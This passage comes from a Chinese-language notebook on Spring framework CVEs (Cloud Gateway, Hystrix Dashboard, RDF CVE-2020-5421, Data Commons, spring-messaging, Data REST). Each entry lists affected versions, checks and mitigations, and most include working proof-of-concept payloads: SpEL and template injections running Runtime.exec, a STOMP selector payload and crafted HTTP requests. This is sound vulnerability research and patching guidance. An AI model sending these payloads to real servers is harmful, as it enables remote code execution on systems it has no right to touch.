  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 0
  
  三、查看
  GET /actuator/gateway/routes/qqq HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 0
  
  四、删除路由
  DELETE /actuator/gateway/routes/qqq HTTP/1.1
  Host: localhost:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  
  五、重复刷新路由步骤
  ```

  

- #### 缓解措施

  ###### 无。不要将路由映射到互联网。

------

# Spring Cloud Netflix Hystrix Dashboard 模板解析漏洞 CVE-2021-22053

- #### 影响版本

  ###### Spring Cloud Netflix  2.2.0.RELEASE到2.2.9.RELEASE、以及更早的不受支持的版本

- #### 安全版本

  ###### Spring Cloud Netflix 升级到2.2.10.RELEASE及以上

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spring Cloud Netflix版本是否在漏洞版本中（本文试验版本Greenwich.SR6）

  ###### 2、检查pom中是否存在thymeleaf组件、hystrix-dashboard组件

  ```
  <dependency>
      <groupId>org.springframework.cloud</groupId>
      <artifactId>spring-cloud-starter-netflix-hystrix-dashboard</artifactId>
       <scope>compile</scope>
  </dependency>
  <dependency>
       <groupId>org.springframework.boot</groupId>
       <artifactId>spring-boot-starter-thymeleaf</artifactId>
  /dependency>
  
  该漏洞需满足系统中存在以上两个组件，且存在漏洞版本中。
  
  spring-cloud-starter-netflix-hystrix-dashboard组件当前最高版本2.2.10.RELEASE(2022/4/30)，但其间接引入spring-cloud-netflix-hystrix-dashboard 2.1.5.RELEASE，因此单独升级spring-cloud-starter-netflix-hystrix-dashboard不能解决漏洞；
  可以先引入spring-cloud-starter-netflix-hystrix-dashboard 2.2.10.RELEASE，可以先从中排除spring-cloud-netflix-hystrix-dashboard 2.1.5.RELEASE，然后引入spring-cloud-netflix-hystrix-dashboard 2.2.10.RELEASE版本，如下图所示：
  ```

  ![image-20220430211542711](https://user-images.githubusercontent.com/33454436/166195676-bb510f97-1f15-41b1-826a-22ab801189df.png)


- #### 漏洞利用

  ###### 命令执行：

  ```
  http://127.0.0.1:8080/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(new String[]{\"calc\"})}__::.x/
  ```

- #### 缓解措施

  ###### 无。

------

# RDF（反射型文件下载）CVE-2020-5421

- #### 影响版本

  ###### Spring Framework 5.2.0 到 5.2.8、5.1.0 到5.1.17、5.0.0 到 5.0.18、4.3.0 到 4.3.28、以及更早的版本

- #### 安全版本

  ###### Spring Framework升级到5.2.9、5.1.18、5.0.19、4.3.29

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spring Framework版本是否在漏洞版本中

  ###### 2、application.properties或yaml中存在如下配置：

  ###### spring.mvc.pathmatch.use-suffix-pattern=true

  ###### spring.mvc.contentnegotiation.favor-path-extension=true

- #### 漏洞利用

  ```
  http://localhost:8080/demo/;jsessionid=/get.bat?str=calc
  
  其中demo是controller中类上的注解的value值，get是方法上的注解value值，str是形参名，calc是可控的bat文件的内容
  
  结合下图可见，可控形参的值需为当前接口的返回值时才可能导致该漏洞
  ```

  ![image-20220430235739162](https://user-images.githubusercontent.com/33454436/166195856-cb717ad0-0d02-4b39-a76b-9afff19af239.png)

- #### 缓解措施

  通过配置过滤器缓解漏洞，白名单请依据具体业务所需进行增删

  ```
  package com.example.cve20205421;
  
  import org.springframework.context.annotation.Configuration;
  import org.springframework.http.HttpHeaders;
  import org.springframework.http.MediaType;
  import org.springframework.lang.Nullable;
  import org.springframework.util.CollectionUtils;
  import org.springframework.util.StringUtils;
  import org.springframework.web.servlet.HandlerMapping;
  import org.springframework.web.util.UrlPathHelper;
  
  import javax.servlet.*;
  import javax.servlet.http.HttpServletRequest;
  import javax.servlet.http.HttpServletResponse;
  import java.io.IOException;
  import java.util.Arrays;
  import java.util.HashSet;
  import java.util.Locale;
  import java.util.Set;
  
  /**
   * Date : 2022/4/30
   * Time : 23:32
   * Author : Nbp
   * 通过全局过滤器缓解漏洞
   */
  @Configuration
  public class RDFFilter implements Filter {
      private final Set<String> safeExtensions = new HashSet<>();
      /*
       *
       * WHITELISTED_EXTENSIONS 中依据具体业务需求所需进行调整，尽可能减少白名单范围
       * */
      private static final Set<String> WHITELISTED_EXTENSIONS = new HashSet<>(Arrays.asList(
              "txt", "text", "yml", "properties", "csv",
              "json", "xml", "atom", "rss",
              "png", "jpe", "jpeg", "jpg", "gif", "wbmp", "bmp"));
              
      @Override
      public void init(FilterConfig filterConfig) throws ServletException {
          Filter.super.init(filterConfig);
      }
      
      @Override
      public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
          HttpServletRequest request = (HttpServletRequest) servletRequest;
          HttpServletResponse response = (HttpServletResponse) servletResponse;
  
          String contentDisposition = response.getHeader(HttpHeaders.CONTENT_DISPOSITION);
          if (!"".equals(contentDisposition) && null != contentDisposition) {
              return;
          }
  
          try {
              int status = response.getStatus();
              if (status < 200 || status > 299) {
                  return;
              }
          } catch (Throwable ex) {
          }
          String requestUri = request.getRequestURI();
          if (requestUri.contains(";jsessionid=")) {
              int index = requestUri.lastIndexOf('/') + 1;
              String filename = requestUri.substring(index);
              String pathParams = "";
              index = filename.indexOf(';');
              if (index != -1) {
                  pathParams = filename.substring(index);
                  filename = filename.substring(0, index);
              }
              UrlPathHelper decodingUrlPathHelper = new UrlPathHelper();
              filename = decodingUrlPathHelper.decodeRequestString(request, filename);
              String ext = StringUtils.getFilenameExtension(filename);
              pathParams = decodingUrlPathHelper.decodeRequestString(request, pathParams);
              String extInPathParams = StringUtils.getFilenameExtension(pathParams);
              if (!safeExtension(request, ext) || !safeExtension(request, extInPathParams)) {
                  response.addHeader(HttpHeaders.CONTENT_DISPOSITION, "inline;filename=test.txt");
              }
          }
          filterChain.doFilter(servletRequest, servletResponse);
      }
  
      private boolean safeExtension(HttpServletRequest request, @Nullable String extension) {
          if (!StringUtils.hasText(extension)) {
              return true;
          }
          extension = extension.toLowerCase(Locale.ENGLISH);
          this.safeExtensions.addAll(WHITELISTED_EXTENSIONS);
          if (this.safeExtensions.contains(extension)) {
              return true;
          }
          String pattern = (String) request.getAttribute(HandlerMapping.BEST_MATCHING_PATTERN_ATTRIBUTE);
          if (pattern != null && pattern.endsWith("." + extension)) {
              return true;
          }
          if (extension.equals("html")) {
              String name = HandlerMapping.PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE;
              Set<MediaType> mediaTypes = (Set<MediaType>) request.getAttribute(name);
              if (!CollectionUtils.isEmpty(mediaTypes) && mediaTypes.contains(MediaType.TEXT_HTML)) {
                  return true;
              }
          }
          return false;
      }
  
  }
  ```

  

------

# Spring Data Commons Spel表达式注入 CVE-2018-1273

- #### 影响版本

  ###### Spring Data Commons 1.13 到 1.13.10 (Ingalls SR10)

  ###### Spring Data REST 2.6 到 2.6.10 (Ingalls SR10)

  ###### Spring Data Commons 2.0 到 2.0.5 (Kay SR5)

  ###### Spring Data REST 3.0 到 3.0.5 (Kay SR5)

  ###### 不受支持的旧版本也会受到影响

- #### 安全版本

  ###### 2.0.x 用户应该升级到 2.0.6、1.13.x 用户应升级到 1.13.11

- #### 排查方法

  ###### 检查lib目录或pom中的Spring Data Commons版本是否在漏洞版本中

- #### 漏洞利用

  ###### 命令执行：

  ```
  POST /demo/get HTTP/1.1
  Host: 192.168.1.5:8080
  Cache-Control: max-age=0
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 56
  
  user[T(java.lang.Runtime).getRuntime().exec(%22calc%22)]
  
  
  COntroller:DemoInter是一个接口，接口中的属性都可以作为payload
  @RestController
  @RequestMapping("/demo")
  public class Demo {
  
  
      @RequestMapping("/get")
      public String get(DemoInter demoInter){
          return "haha";
      }
      @RequestMapping("/get2")
      public String get2(bean2 demoInter){
          return "haha";
      }
  
  }
  
  public interface DemoInter {
      String getName();
      String[] getUser();
  }
  ```

  ##### 通过diff，大家都知道这还是一个Spel注入问题，漏洞触发点在MapDataBind的setPropertyValue()

  ![image-20220501015854596](https://user-images.githubusercontent.com/33454436/166196185-441eaff6-6640-4c7a-a02d-2c70f4f7bc16.png)

  ##### 如代码块中所示，Controller中存在两个接口，get的形参是Demointer(接口) ，get2的形参是一个类；

  ##### 通过debug找到数据绑定的如下节点，对这里有些疑惑
  ![image-20220501021616494](https://user-images.githubusercontent.com/33454436/166196236-82ed5b86-bf9e-43ed-bfcb-6176c13f86d0.png)
  

  ##### 为什么这里返回的ConfigurablePropertyAccessor的是MapDataBind的MapPropertyAccessor，这就使后续的setPropertyValue()调用会进入到MapDataBind，而形参是一个类的则在PropertyAccessor返回类型是不一样的，难道是形参为接口类型的数据绑定时PropertyAccessor都应该用MapPropertyAccessor吗？而且上在pom中注释掉commons坐标，启动时候会报没有DemoInter的init方法。
  ![image-20220501021959622](https://user-images.githubusercontent.com/33454436/166196269-b3f18afb-d823-4628-85da-dee0372a71ad.png)

  




- #### 缓解措施

无

------

# spring-messaging 远程执行代码  CVE-2018-1270

- #### 影响版本

  ###### Spring Framework 5.0 到 5.0.4、4.3 到 4.3.15、不受支持的旧版本也会受到影响

- #### 安全版本

  ###### 5.0.x 用户应升级到 5.0.5

  ###### 4.3.x 用户应升级到 4.3.16

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spring Framework版本是否在漏洞版本中

  ###### 2、检查应用程序是否使用spring-messaging组件

- #### 漏洞利用

  ###### 命令执行：

  ```
  向STOMP代理发送SUBSCRIBE包：
  ["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\n\nu0000"]
  ```

- #### 缓解措施

  无。

------

# Spring Data REST 中 PATCH Spel表达式注入 CVE-2017-8046

- #### 影响版本

  ###### 2.6.9 (Ingalls SR9)、3.0.1 (Kay SR1) 之前的 Spring Data REST 版本

  ###### Spring Boot（如果使用 Spring Data REST 模块）1.5.9、2.0 M6 之前的版本

- #### 安全版本

  ###### Spring Data REST 2.6.9（Ingalls SR9）

  ###### Spring Data REST 3.0.1（Kay SR1）

  ###### Spring Boot 1.5.9

  ###### Spring Boot 2.0 M6

- #### 排查方法

  ###### 1、检查lib目录或pom中的Spingboot和Spring Data REST版本是否在漏洞版本中

  ###### 2、检查应用程序是否使用Spring Data REST组件

- #### 漏洞利用

  ###### 命令执行：

  ```
  PATCH /people/1 HTTP/1.1
  Host: localhost:8080
  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type:application/json-patch+json
  Upgrade-Insecure-Requests: 1
  Content-Length: 147
  
  [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))/lastName", "value": "vulhub" }]
  ```

- #### 缓解措施

  ###### 不使用Spring Data Rest可构建Rest Web则不影响；

  ###### 官方未给出缓解措施，自己写了如下缓解demo，经测试可用

  一、

  ###### 通过实现RepositoryRestConfigurer接口，ExposureConfiguration对象也可以自定义不使用某种请求方式，但ExposureConfiguration在3.1版本才有。

  

  ###### 二、这个方法要在系统中引入spring security，限制使用PATCH请求头：

  ```java
  @Configuration
  @EnableWebSecurity
  public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter {
      @Value("${security.enable-csrf}")
      private boolean csrfEnabled;
  
      @Override
      protected void configure(HttpSecurity http) throws Exception {
          if (!csrfEnabled) {
              http.csrf().disable();
          }
          http.authorizeRequests()
                  .antMatchers(HttpMethod.PATCH, "/**").denyAll();
      }
  }
  ```

  ###### security 4.x默认开启CSRF防护，如果之前系统中没用这个，那么要在配置文件中关闭csrf:

  ###### security.enable-csrf=false,如果不生效就按照我这样写

  ![image-20220502012235913](https://user-images.githubusercontent.com/33454436/166196330-e42ffcf6-d07a-4dac-8990-1f851d00a928.png)
  ![image-20220502012251291](https://user-images.githubusercontent.com/33454436/166196336-fc92233b-3400-4e61-904c-7e67ad5cf949.png)
